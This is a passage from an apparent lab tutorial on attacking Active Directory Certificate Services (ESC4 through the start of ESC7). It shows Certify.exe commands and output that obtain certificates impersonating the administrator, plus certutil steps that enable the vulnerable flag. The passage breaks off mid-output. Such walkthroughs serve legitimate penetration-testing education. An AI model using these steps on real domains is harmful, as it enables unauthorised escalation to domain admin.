  <span class="o">/</span> <span class="n">____</span><span class="o">|</span>        <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="o">/</span> <span class="n">_</span><span class="o">|</span>
 <span class="o">|</span> <span class="o">|</span>     <span class="n">___</span> <span class="n">_</span> <span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>
 <span class="o">|</span> <span class="o">|</span>    <span class="o">/</span> <span class="n">_</span> \ <span class="s1">'__| __| |  _| | | |</span>
 <span class="o">|</span> <span class="o">|</span><span class="n">___</span><span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span>
  \<span class="n">_____</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>   \<span class="n">__</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span> <span class="o">|</span>
                             <span class="n">__</span><span class="o">/</span> <span class="o">|</span>
                            <span class="o">|</span><span class="n">___</span><span class="o">./</span>
  <span class="n">v1</span><span class="mf">.1.0</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Request</span> <span class="n">a</span> <span class="n">Certificates</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Current</span> <span class="n">user</span> <span class="n">context</span>    <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">elswix</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">No</span> <span class="n">subject</span> <span class="n">name</span> <span class="n">specified</span><span class="p">,</span> <span class="n">using</span> <span class="n">current</span> <span class="n">context</span> <span class="k">as</span> <span class="n">subject</span><span class="o">.</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Template</span>                <span class="p">:</span> <span class="n">ESC4</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Subject</span>                 <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswix</span><span class="p">,</span> <span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">local</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AltName</span>                 <span class="p">:</span> <span class="n">administrator</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">Authority</span>   <span class="p">:</span> <span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">CA</span> <span class="n">Response</span>             <span class="p">:</span> <span class="n">The</span> <span class="n">certificate</span> <span class="n">had</span> <span class="n">been</span> <span class="n">issued</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span>              <span class="p">:</span> <span class="mi">21</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span>         <span class="p">:</span>

<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="n">MIIEowIBAAKCAQEAuIVCD9TJD8oIzW8</span><span class="o">+</span><span class="n">lh7qQHNd3a5VZqLzyPK3dKGFTcsM8WjW</span>
<span class="n">RpTQX0nZKE2l1XgQ1PgtI2</span><span class="o">++</span><span class="n">PJuLomxsYQZ2CMUELBOBMITbTkcQZNP5uKCKqHEz</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">uVH0mvhKmB0AWKTTrcIWBaGuhwBkvAGFHcGzLez</span><span class="o">/</span><span class="n">RgEHDMpSG7fLD9GhM3HLvLGb</span>
<span class="n">b0iU2h8Xm9ug3TLNZ9BrnIzlUjbTPjHRDMne8USm5LWLCJYbZC1U</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
<span class="n">MIIFwzCCBKugAwIBAgITPgAAABXm</span><span class="o">+</span><span class="n">dcxkAITHAAAAAAAFTANBgkqhkiG9w0BAQsF</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">AId2EcRVuyZRnVYnQqkJ8q69EKx1HK1DR7luf7ndBpUhHp28Vz8nxWi7jChBSCof</span>
<span class="mi">4</span><span class="n">kvzVGZzR4OmvPICaQiCJx0XAoxktriNjmOgB1FuV27o8pS6Q1miXXr</span><span class="o">+</span><span class="mi">1</span><span class="n">y1p4Uy0</span>
<span class="mi">2</span><span class="n">zo4yi16XRcYnrK</span><span class="o">/</span><span class="n">mFFErfcph</span><span class="o">+</span><span class="n">c2rJRJlOCqsHBuKK79PQDM5</span><span class="o">/</span><span class="mi">9</span><span class="n">A</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>


<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Convert</span> <span class="k">with</span><span class="p">:</span> <span class="n">openssl</span> <span class="n">pkcs12</span> <span class="o">-</span><span class="ow">in</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">keyex</span> <span class="o">-</span><span class="n">CSP</span> <span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span> <span class="o">-</span><span class="n">export</span> <span class="o">-</span><span class="n">out</span> <span class="n">cert</span><span class="o">.</span><span class="n">pfx</span>



<span class="n">Certify</span> <span class="n">completed</span> <span class="ow">in</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">15.6198808</span>
</pre></div>
<p>As seen above, we can request certificates providing our own <strong>SAN</strong>, and this certificate can now be used for authentication.</p><br/>
<h3>Vulnerable PKI Object Access Control (ESC5)</h3><br/>
<p>This technique exploits misconfigured <strong>Discretionary Access Control Lists (DACLs)</strong> on Active Directory objects that have control over the <strong>Active Directory Certificate Services (ADCS)</strong> system. While this attack does not directly target certificate templates or the CA itself, it can still have a significant impact on the security of the entire <strong>Public Key Infrastructure (PKI)</strong>.</p><br/>
<p>Various objects within Active Directory can influence the behavior and security of <strong>ADCS</strong> if improperly configured. Some of the key targets include:</p><br/>
<ul>
<li>
<p><strong>The CA Server's AD Computer Object</strong>: If an attacker gains control over the CA’s computer object, they could exploit <strong>Resource-Based Constrained Delegation (RBCD)</strong> to escalate privileges and potentially take control of the CA itself (we'll show this scenario later).</p><br/>
</li>
<li>
<p><strong>The CA Server’s RPC/DCOM Configuration</strong>: Misconfigurations in the Remote Procedure Call (RPC) or Distributed Component Object Model (DCOM) settings on the CA server could allow an attacker to execute privileged actions remotely.</p><br/>
</li>
<li>
<p><strong>AD Objects in the PKI Configuration Container</strong>: Many critical settings for ADCS are stored under <code>CN=Public Key Services,CN=Services,CN=Configuration,DC=&lt;COMPANY&gt;,DC=&lt;COM&gt;</code>. An attacker with improper privileges over objects within this container—such as <strong>Certificate Templates, Certification Authorities, NTAuthCertificates, or Enrollment Services</strong>—could manipulate these settings to weaken the certificate issuance process, bypass security controls, or issue rogue certificates.</p><br/>
</li>
</ul>
<h3>EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6)</h3><br/>
<p>The <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> attribute, when enabled, allows clients to supply an arbitrary SAN even if the template doesn't have the <code>Supply in Request</code> option activated. This setting is applied at the <strong>Certification Authority</strong> level, not at the template level.</p><br/>
<p>This is dangerous and should never be used, but some administrators may enable it without realizing the security risks.</p><br/>
<p>With this option enabled, any template that allows <strong>Client Authentication</strong> (like the default <strong>User</strong> template) can be abused. If a low-privileged user has <strong>enroll</strong> permissions (which is the default for the User template), they can request a certificate for a <strong>Domain Admin</strong>, escalating privileges easily.</p><br/>
<p>For practice, you can enable this attribute using <strong>PowerShell</strong>, but you need to be a high-privileged user:</p><br/>
<div class="highlight"><pre><span></span><span class="n">certutil</span> <span class="o">-</span><span class="n">setreg</span> <span class="n">policy</span>\<span class="n">EditFlags</span> <span class="o">+</span><span class="n">EDITF_ATTRIBUTESUBJECTALTNAME2</span>
</pre></div>
<p>Then, restart the <code>CertSrv</code> service to apply the changes:</p><br/>
<div class="highlight"><pre><span></span><span class="nb">Restart-Service</span> <span class="n">CertSvc</span>
</pre></div>
<p>This "misconfiguration" can be found using <code>Certify.exe</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">certify</span><span class="o">.</span><span class="n">exe</span> <span class="n">find</span> <span class="o">/</span><span class="n">vulnerable</span>

   <span class="n">_____</span>          <span class="n">_</span>   <span class="n">_</span>  <span class="n">__</span>
  <span class="o">/</span> <span class="n">____</span><span class="o">|</span>        <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="o">/</span> <span class="n">_</span><span class="o">|</span>
 <span class="o">|</span> <span class="o">|</span>     <span class="n">___</span> <span class="n">_</span> <span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>
 <span class="o">|</span> <span class="o">|</span>    <span class="o">/</span> <span class="n">_</span> \ <span class="s1">'__| __| |  _| | | |</span>
 <span class="o">|</span> <span class="o">|</span><span class="n">___</span><span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span>
  \<span class="n">_____</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>   \<span class="n">__</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span> <span class="o">|</span>
                             <span class="n">__</span><span class="o">/</span> <span class="o">|</span>
                            <span class="o">|</span><span class="n">___</span><span class="o">./</span>
  <span class="n">v1</span><span class="mf">.1.0</span>

<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Listing</span> <span class="n">info</span> <span class="n">about</span> <span class="n">the</span> <span class="n">Enterprise</span> <span class="n">CA</span> <span class="s1">'elswixcorp-DC02-CA'</span>

    <span class="n">Enterprise</span> <span class="n">CA</span> <span class="n">Name</span>            <span class="p">:</span> <span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span>
    <span class="n">DNS</span> <span class="n">Hostname</span>                  <span class="p">:</span> <span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
    <span class="n">FullName</span>                      <span class="p">:</span> <span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span>
    <span class="n">Flags</span>                         <span class="p">:</span> <span class="n">SUPPORTS_NT_AUTHENTICATION</span><span class="p">,</span> <span class="n">CA_SERVERTYPE_ADVANCED</span>
    <span class="n">Cert</span> <span class="n">SubjectName</span>              <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">local</span>
    <span class="n">Cert</span> <span class="n">Thumbprint</span>               <span class="p">:</span> <span class="mi">7</span><span class="n">DC78F3D8C2FE11B86C093B1DDF3C4D7D28EC360</span>
    <span class="n">Cert</span> <span class="n">Serial</span>                   <span class="p">:</span> <span class="mi">350000002</span><span class="n">AB93A8248640A12F400000000002A</span>
    <span class="n">Cert</span> <span class="n">Start</span> <span class="n">Date</span>               <span class="p">:</span> <span class="mi">3</span><span class="o">/</span><span class="mi">8</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">3</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">19</span> <span class="n">PM</span>
    <span class="n">Cert</span> <span class="n">End</span> <span class="n">Date</span>                 <span class="p">:</span> <span class="mi">3</span><span class="o">/</span><span class="mi">8</span><span class="o">/</span><span class="mi">2027</span> <span class="mi">4</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="mi">19</span> <span class="n">PM</span>
    <span class="n">Cert</span> <span class="n">Chain</span>                    <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span> <span class="o">-&gt;</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
    <span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">UserSpecifiedSAN</span> <span class="p">:</span> <span class="n">EDITF_ATTRIBUTESUBJECTALTNAME2</span> <span class="nb">set</span><span class="p">,</span> <span class="n">enrollees</span> <span class="n">can</span> <span class="n">specify</span> <span class="n">Subject</span> <span class="n">Alternative</span> <span class="n">Names</span><span class="err">!</span>
    <span class="n">CA</span> <span class="n">Permissions</span>                <span class="p">:</span>
      <span class="n">Owner</span><span class="p">:</span> <span class="n">BUILTIN</span>\<span class="n">Administrators</span>        <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">544</span>

      <span class="n">Access</span> <span class="n">Rights</span>                                     <span class="n">Principal</span>

      <span class="n">Allow</span>  <span class="n">Enroll</span>                                     <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">Authenticated</span> <span class="n">UsersS</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">11</span>
      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">BUILTIN</span>\<span class="n">Administrators</span>        <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">544</span>
      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Admins</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">512</span>
      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">ELSWIXCORP</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>  <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">519</span>
    <span class="n">Enrollment</span> <span class="n">Agent</span> <span class="n">Restrictions</span> <span class="p">:</span> <span class="kc">None</span>
</pre></div>
<p>Now, as a normal user, you can request a certificate for any template, specifying an <strong>arbitrary SAN</strong>. Here, I'll set the <strong>Administrator</strong> account as the SAN and use the <strong>User</strong> template:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">certify</span><span class="o">.</span><span class="n">exe</span> <span class="n">request</span> <span class="o">/</span><span class="n">altname</span><span class="p">:</span><span class="n">administrator</span> <span class="o">/</span><span class="n">ca</span><span class="p">:</span><span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span> <span class="o">/</span><span class="n">template</span><span class="p">:</span><span class="n">User</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Request</span> <span class="n">a</span> <span class="n">Certificates</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Current</span> <span class="n">user</span> <span class="n">context</span>    <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">elswix</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">No</span> <span class="n">subject</span> <span class="n">name</span> <span class="n">specified</span><span class="p">,</span> <span class="n">using</span> <span class="n">current</span> <span class="n">context</span> <span class="k">as</span> <span class="n">subject</span><span class="o">.</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Template</span>                <span class="p">:</span> <span class="n">User</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Subject</span>                 <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswix</span><span class="p">,</span> <span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">local</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AltName</span>                 <span class="p">:</span> <span class="n">administrator</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">Authority</span>   <span class="p">:</span> <span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">CA</span> <span class="n">Response</span>             <span class="p">:</span> <span class="n">The</span> <span class="n">certificate</span> <span class="n">had</span> <span class="n">been</span> <span class="n">issued</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span>              <span class="p">:</span> <span class="mi">22</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span>         <span class="p">:</span>

<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="n">MIIEpQIBAAKCAQEAvSjiGf90i2crQBi30Awb6rqj4jOk73dbpYHYHPY</span><span class="o">/</span><span class="n">geMU</span><span class="o">+</span><span class="n">cCf</span>
<span class="n">tcemzgNYhhH3kYYdqTHuSsZx8h3df</span><span class="o">+</span><span class="n">C6bTgJEF42p7LcQWBsj2L</span><span class="o">+</span><span class="n">XV4LH27XQ6kU</span>
<span class="mi">5</span><span class="n">RFJyUBUaehbmRKbPBeJ9</span><span class="o">/</span><span class="n">L</span><span class="o">+</span><span class="n">qnzxNJo2tYgsHQ97a6tGrpNTYWZotemTDl3mgkRl</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">Djh3TmjrAoGABhOlRz2vPmX3I0Tn4</span><span class="o">+</span><span class="n">tOFdTVoWpPcapUv8N6hkKkbx</span><span class="o">/</span><span class="n">bO5grBmFo</span>
<span class="n">eUszPWi5k6GKI90Bt5KbgqJHulsrDac</span><span class="o">/</span><span class="n">WDbzU2nYkggiXRmTXz</span><span class="o">/</span><span class="n">x62yhqe9</span><span class="o">+</span><span class="n">KkZP</span>
<span class="o">/</span><span class="n">ISvv2UfeZtoUbNwHZSDO</span><span class="o">+</span><span class="n">DQWHf</span><span class="o">/</span><span class="n">p</span><span class="o">+</span><span class="n">AtK8uHm7aEZzmRAo1W3</span><span class="o">+</span><span class="mi">3</span><span class="n">q3qo</span><span class="o">=</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
<span class="n">MIIGBzCCBO</span><span class="o">+</span><span class="n">gAwIBAgITPgAAABb4YoJi9o718gAAAAAAFjANBgkqhkiG9w0BAQsF</span>
<span class="n">ADBQMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGjAYBgoJkiaJk</span><span class="o">/</span><span class="n">IsZAEZFgplbHN3</span>
<span class="n">aXhjb3JwMRswGQYDVQQDExJlbHN3aXhjb3JwLURDMDItQ0EwHhcNMjUwNDAxMDIx</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span><span class="n">GEB55LG2uFqn9fJx7yKSFeRtWCfUJUAJW7Ahk2UFN</span>
<span class="n">IflBFREs6IboZpajU5eHr3ojKnfRjpQXPi5VAdDCAvw6oFmirso2Nnm9MJgHusk</span><span class="o">+</span>
<span class="n">pf</span><span class="o">+</span><span class="n">kDGVif2Hu1s8</span><span class="o">=</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>


<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Convert</span> <span class="k">with</span><span class="p">:</span> <span class="n">openssl</span> <span class="n">pkcs12</span> <span class="o">-</span><span class="ow">in</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">keyex</span> <span class="o">-</span><span class="n">CSP</span> <span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span> <span class="o">-</span><span class="n">export</span> <span class="o">-</span><span class="n">out</span> <span class="n">cert</span><span class="o">.</span><span class="n">pfx</span>



<span class="n">Certify</span> <span class="n">completed</span> <span class="ow">in</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">15.2667987</span>
</pre></div>
<p>This certificate can now be used to authenticate as <strong>Administrator</strong>.</p><br/>
<h3>Vulnerable Certificate Authority Access Control (ESC7)</h3><br/>
<p>Apart from certificate templates, a <strong>Certificate Authority (CA)</strong> itself has permissions that control various CA actions. These can be accessed through <strong>certsrv.msc</strong>. From a security standpoint, the most critical permissions are:</p><br/>
<ul>
<li>
<p><strong>ManageCA ("CA Administrator")</strong>: Grants a principal the ability to perform <strong>administrative actions</strong> on the CA, including modifying persistent configuration data. Notably, this includes enabling the <strong>EDITF_ATTRIBUTESUBJECTALTNAME2</strong> flag, which directly facilitates <strong>ESC6</strong> exploitation. This can be achieved using the <strong>PSPKI</strong> module’s <code>Enable-PolicyModuleFlag</code> cmdlet.</p><br/>
</li>
<li>
<p><strong>ManageCertificates ("Certificate Manager/Officer")</strong>: Allows a principal to <strong>approve pending certificate requests</strong>, effectively bypassing the <strong>Manager Approval</strong> issuance requirement. While this permission alone <strong>does not</strong> compromise the domain, it <strong>removes a key security protection</strong>, making exploitation easier.</p><br/>
</li>
</ul>
<p>To demonstrate this technique, we'll take a different approach instead of making the CA vulnerable to <strong>ESC6</strong>. Although having <strong>ManageCA</strong> privileges allows enabling the <strong>EDITF_ATTRIBUTESUBJECTALTNAME2</strong> flag, restarting the <code>CertSvc</code> service is required to apply the changes, which may not always be possible.</p><br/>
<p>However, these privileges can still be abused in other ways. In this case, we'll exploit <strong>ManageCA</strong> privileges to enable the <strong>SubCA</strong> template and request certificates using it.</p><br/>
<p>The <strong>SubCA</strong> template has the <strong>Supply in Request</strong> option for the <strong>Subject Name</strong>, meaning it is vulnerable to <strong>ESC1</strong>. The problem is that only <strong>Administrators</strong> can enroll in this template. This means that if a non-privileged user requests a certificate using this template, the request <strong>fails</strong>, but a <strong>Certificate Manager/Officer</strong> can still approve it.</p><br/>
<p>By default, <strong>ManageCA</strong> privileges <strong>do not</strong> include <strong>ManageCertificates</strong> (Certificate Manager/Officer) privileges. However, since we <strong>control</strong> the CA, we can <strong>grant ourselves</strong> the necessary privileges to approve the request.</p><br/>
<p>Initially, let's search for misconfigurations using <code>Certify.exe</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">certify</span><span class="o">.</span><span class="n">exe</span> <span class="n">find</span> <span class="o">/</span><span class="n">vulnerable</span>

<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Listing</span> <span class="n">info</span> <span class="n">about</span> <span class="n">the</span> <span class="n">Enterprise</span> <span class="n">CA</span> <span class="s1">'elswixcorp-DC02-CA'</span>

    <span class="n">Enterprise</span> <span class="n">CA</span> <span class="n">Name</span>            <span class="p">:</span> <span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span>
    <span class="n">DNS</span> <span class="n">Hostname</span>                  <span class="p">:</span> <span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
    <span class="n">FullName</span>                      <span class="p">:</span> <span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span>
    <span class="n">Flags</span>                         <span class="p">:</span> <span class="n">SUPPORTS_NT_AUTHENTICATION</span><span class="p">,</span> <span class="n">CA_SERVERTYPE_ADVANCED</span>
    <span class="n">Cert</span> <span class="n">SubjectName</span>              <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">local</span>
    <span class="n">Cert</span> <span class="n">Thumbprint</span>               <span class="p">:</span> <span class="mi">7</span><span class="n">DC78F3D8C2FE11B86C093B1DDF3C4D7D28EC360</span>
    <span class="n">Cert</span> <span class="n">Serial</span>                   <span class="p">:</span> <span class="mi">350000002</span><span class="n">AB93A8248640A12F400000000002A</span>
    <span class="n">Cert</span> <span class="n">Start</span> <span class="n">Date</span>               <span class="p">:</span> <span class="mi">3</span><span class="o">/</span><span class="mi">8</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">3</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">19</span> <span class="n">PM</span>
    <span class="n">Cert</span> <span class="n">End</span> <span class="n">Date</span>                 <span class="p">:</span> <span class="mi">3</span><span class="o">/</span><span class="mi">8</span><span class="o">/</span><span class="mi">2027</span> <span class="mi">4</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="mi">19</span> <span class="n">PM</span>
    <span class="n">Cert</span> <span class="n">Chain</span>                    <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span> <span class="o">-&gt;</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
    <span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">UserSpecifiedSAN</span> <span class="p">:</span> <span class="n">EDITF_ATTRIBUTESUBJECTALTNAME2</span> <span class="nb">set</span><span class="p">,</span> <span class="n">enrollees</span> <span class="n">can</span> <span class="n">specify</span> <span class="n">Subject</span> <span class="n">Alternative</span> <span class="n">Names</span><span class="err">!</span>
    <span class="n">CA</span> <span class="n">Permissions</span>                <span class="p">:</span>
